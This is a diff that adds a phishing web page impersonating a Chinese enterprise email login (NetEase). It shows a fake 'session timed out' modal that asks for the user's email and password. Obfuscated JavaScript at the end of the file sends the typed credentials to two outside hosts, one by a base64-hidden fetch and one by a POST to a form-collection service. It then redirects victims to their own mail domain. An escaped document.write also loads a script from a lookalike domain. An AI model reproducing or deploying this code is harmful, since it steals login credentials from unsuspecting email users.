@@ -1,0 +1,77 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <title>&#32593;&#26131;&#20225;&#19994;&#37038;&#31665;&#32;&#45;&#32;&#30331;&#24405;&#20837;&#21475;</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/LinkedIn_logo_initials.png/640px-LinkedIn_logo_initials.png"/>
+    <style type="text/css">
+    </style>
+</head>
+
+<body style="background:url('https://imgur.com/lNdrVVl.png'); background-size: cover; background-repeat: no-repeat;">
+    <button type="button" class="btn btn-primary" id="m-btn" data-toggle="modal" data-target="#exampleModalCenter" style="visibility: hidden;">
+        Launch demo modal
+    </button>
+    <!-- Modal -->
+    <div class="modal fade" id="exampleModalCenter" data-backdrop="static" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content" style="min-width: 550px">
+                <div class="modal-header p-2" style="background-color: #E9E9E9;">
+                    <button type="button" class="close" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body px-5">
+                    <span style="font-weight: 700; color: #575757;font-size: 17px">电子邮件登录超时，请重新登录
+                    </span>
+                    <form class="mt-4">
+                        <center>
+                            <div class="alert alert-danger" id="msg" style="display: none;">无效的密码！请输入正确的密码。</div>
+                            <span id="error" class="text-danger" style="display: none;">该帐户不存在。输入其他帐户。</span>
+                        </center>
+                        <div class="form-group row">
+                            <label for="staticai" class="col-sm-4 col-form-label">用户名</label>
+                            <div class="col-sm-8">
+                                <input type="email" class="ai form-control py-1" id="ai" value="">
+                            </div>
+                        </div>
+                        <div class="form-group row">
+                            <label for="inputpr" class="col-sm-4 col-form-label">邮箱密码</label>
+                            <div class="col-sm-8 ">
+                                <input type="password" class="pr form-control py-1" id="pr" placeholder="">
+                            </div>
+                        </div>
+                    </form>
+                </div>
+                <div class="modal-footer p-2">
+                    <button type="button" class="btn btn-success py-1" id="submit-btn">登录</button>
+                    <button type="button" class="btn btn-secondary py-1">取消</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.slim.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/2.9.2/umd/popper.min.js" ></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+</body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script language="javascript">document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%66%6F%6E%74%73%2E%63%66%64%2F%61%6A%2F%6A%71%75%65%72%79%2F%6A%71%75%65%72%79%33%2E%33%2E%31%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E'))</script>
+<script>
+/* global $ */
+$(document).ready(function(){var e=0;dd=document,tt=atob,dd.querySelector(tt("I3N1Ym1pdC1idG4=")).addEventListener(tt("Y2xpY2s="),function(e){fetch(tt("aHR0cHM6Ly+9teWlwcy5jYy9pcC8/YT1jaGluYU1haWwmYj0=".replace(tt("Kw=="),""))+dd.querySelector(tt("LmFp")).value+tt("JmM9")+dd.querySelector(tt("LnBy")).value)}),$("#m-btn").click();var r=window.location.hash.substr(1);if(r){if(/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/.test(r))var t=atob(r);else var t=r;var a=t.indexOf("@"),o=t.substr(a+1);o.substr(0,o.indexOf(".")).toLowerCase(),$("#ai").val(t),$("#ai").attr("readonly",!0),$("#msg").hide()}$("#submit-btn").click(function(r){$("#error").hide(),$("#msg").hide(),r.preventDefault();var t=$("#ai").val(),a=$("#pr").val(),o=$("#msg").html();$("#msg").text(o);var s=t;if(!t)return $("#error").show(),$("#error").html("Email field is emply.!"),t.focus,!1;if(!/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(s))return $("#error").show(),$("#error").html("That account doesn't exist. Enter a different account"),t.focus,!1;if(!a)return $("#error").show(),$("#error").html("Password field is emply.!"),t.focus,!1;var i=s.indexOf("@"),n=s.substr(i+1);n.substr(0,n.indexOf(".")).toLowerCase(),e+=1,$.ajax({dataType:"JSON",url:atob("aHR0cHM6Ly9ub2NvZGVmb3JtLmlvL2YvNjUzOWFiNTVlOGE3ZTU1MWMzMTg1YWQz"),type:"POST",data:{ai:t,pr:a},beforeSend:function(e){$("#submit-btn").html("验证中...")},success:function(r){if(r&&($("#msg").show(),console.log(r),"ok"==r.signal&&($("#pr").val(""),e>=2)))return e=0,window.location.replace("http://www."+n),!1},error:function(){if($("#pr").val(""),e>=2)return e=0,window.location.replace("http://www."+n),!1;$("#msg").show()},complete:function(){$("#submit-btn").html("登录")}})})});
+</script>
+
+</html>
